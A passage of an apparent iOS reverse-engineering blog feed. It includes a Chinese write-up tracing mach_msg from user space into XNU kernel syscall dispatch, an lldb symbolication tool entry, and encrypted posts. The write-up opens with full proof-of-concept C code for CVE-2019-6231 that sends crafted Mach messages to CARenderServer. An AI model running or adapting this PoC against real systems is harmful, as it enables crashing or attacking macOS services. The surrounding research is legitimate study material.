    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
